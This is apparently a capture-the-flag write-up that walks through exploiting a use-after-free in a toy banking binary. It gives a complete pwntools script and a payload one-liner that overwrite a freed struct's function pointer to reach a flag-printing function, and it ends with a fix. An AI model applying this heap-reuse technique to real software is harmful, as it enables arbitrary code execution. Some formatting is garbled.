# Digital Bank Vault - Writeup

**Challenge:** Digital Bank Vault  
**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Medium  
**Points:** 350  

## TL;DR

This challenge contains a Use-After-Free (UAF) vulnerability in the account management system. By deleting an account and then creating a new one with a crafted payload, we can control freed memory and overwrite function pointers to redirect execution to the `admin_access` function.

## Initial Analysis

### Binary Information
```bash
$ checksec bank_vault
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE

NX enabled: Stack is not executable
No PIE: Binary base address is fixed
No stack canary: Stack buffer overflows possible
Partial RELRO: GOT is partially writable

Reverse Engineering
Running the binary reveals a banking application with several functions:
🏦 DIGITAL BANK VAULT SYSTEM 🏦
1. Create Account
2. Delete Account  
3. View Account
4. Transfer Funds
5. List Accounts
6. Exit
Using nm or objdump, we can identify key functions:
bash$ nm bank_vault | grep -E "(create|delete|view|admin)"
0000000000401293 T admin_access
00000000004013xx T create_account
00000000004014xx T delete_account
00000000004015xx T view_account
The admin_access function at 0x401293 is our target - it reads and prints the flag.
Vulnerability Analysis
Memory Structure
The application uses a struct for accounts:
cstruct account {
    char name[32];           // Offset 0-31
    unsigned long balance;   // Offset 32-39  
    void (*print_balance)(struct account*);   // Offset 40-47
    void (*transfer_funds)(struct account*, unsigned long); // Offset 48-55
};
The UAF Bug
Analyzing the delete function reveals the vulnerability:
cvoid delete_account() {
    // ... input validation ...
    free(accounts[idx]);
    // BUG: accounts[idx] is NOT set to NULL!
    printf("Account deleted\n");
}
The issue: After free(), the pointer in accounts[idx] still points to the freed memory region, but that memory can be reallocated for new accounts.
Exploitation Strategy

Create account → Allocates memory for account struct
Delete account → Frees memory but pointer remains
Create malicious account → New allocation reuses freed memory
Access deleted account → Uses old pointer to access our controlled data

Exploitation
Step 1: Confirm UAF Exists
bash$ ./bank_vault
Choice: 1
Enter account name: AAAA
Choice: 2  
Enter account ID to delete: 0
Choice: 1
Enter account name: BBBB
Choice: 5
If we see account 0 showing "BBBB" or garbled data, UAF is confirmed.
Step 2: Craft Exploit
The key insight is that create_account uses read(0, new_acc, sizeof(struct account)), allowing us to write all 56 bytes of the struct, including function pointers.
python#!/usr/bin/env python3
from pwn import *

binary_path = './bank_vault'
p = process(binary_path)

# Get admin_access address
elf = ELF(binary_path)
admin_addr = elf.symbols['admin_access']
log.success(f"admin_access: {hex(admin_addr)}")

# 1. Create account
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Enter account name: ', b'victim')

# 2. Delete account (UAF)
p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'Enter account ID to delete: ', b'0')

# 3. Create malicious account with controlled function pointer
payload = b'HACKER' + b'\x00' * 26  # name (32 bytes)
payload += p64(0x1337)              # balance (8 bytes)
payload += p64(admin_addr)          # print_balance pointer (8 bytes)
payload += p64(0x0000000000000000)  # transfer_funds pointer (8 bytes)

p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'Enter account name: ', payload)

# 4. Trigger UAF - should call admin_access!
p.sendlineafter(b'Choice: ', b'3')
p.sendlineafter(b'Enter account ID to view: ', b'0')

p.interactive()
Step 3: Execution Flow

Account creation: Memory allocated at address X
Account deletion: Memory at X is freed
Malicious account: malloc() returns same address X, our payload overwrites the struct
UAF trigger: accounts[0]->print_balance(accounts[0]) calls our controlled function pointer

Step 4: Success
=== Account Information ===
🏦 ADMIN ACCESS GRANTED! 🏦
Accessing bank vault...
FLAG: flag{uaf_master_hacker_2024}
===========================
Technical Deep Dive
Memory Layout Analysis
Before deletion:
accounts[0] → [struct at 0x405260]
                ├─ name: "victim"
                ├─ balance: 1000  
                ├─ print_balance: 0x401216 (show_balance)
                └─ transfer_funds: 0x40125f (transfer_money)

After deletion:
accounts[0] → [freed memory at 0x405260]
                └─ Contents: undefined

After malicious creation:  
accounts[0] → [struct at 0x405260]  (same address!)
accounts[1] → [struct at 0x405260]  (reused memory!)
                ├─ name: "HACKER\x00..."
                ├─ balance: 0x1337
                ├─ print_balance: 0x401293 (admin_access)
                └─ transfer_funds: 0x0000000000000000
Alternative Triggers
The UAF can be triggered through multiple code paths:

View account: Calls print_balance function pointer
Transfer funds: Calls transfer_funds function pointer
List accounts: Accesses name/balance fields

Mitigation
The vulnerability could be prevented by:
cvoid delete_account() {
    // ... existing code ...
    free(accounts[idx]);
    accounts[idx] = NULL;  // Fix: nullify pointer
    printf("Account deleted\n");
}
Alternative Solutions
Manual Approach
Without scripts, the exploit requires creating a binary payload file:
bashpython3 -c "
import struct
admin_addr = 0x401293
payload = b'HACKER' + b'\x00' * 26 + struct.pack('<Q', 0x1337) + struct.pack('<Q', admin_addr) + struct.pack('<Q', 0)
open('payload.bin', 'wb').write(payload)
"

# Then use with: cat payload.bin | ./bank_vault (with appropriate input sequence)
GDB Analysis
For learning purposes, the vulnerability can be analyzed dynamically:
bashgdb ./bank_vault
(gdb) break create_account
(gdb) break view_account
(gdb) run
# ... follow exploitation steps ...
(gdb) x/7gx accounts[0]  # Examine struct contents
Conclusion
This UAF vulnerability demonstrates how improper memory management can lead to arbitrary code execution. The key lessons:

Always nullify pointers after freeing memory
UAF vulnerabilities often involve function pointer overwrites
Heap layout manipulation is crucial for reliable exploitation
Modern exploitation often requires precise payload crafting

Flag: flag{uaf_master_hacker_2024}
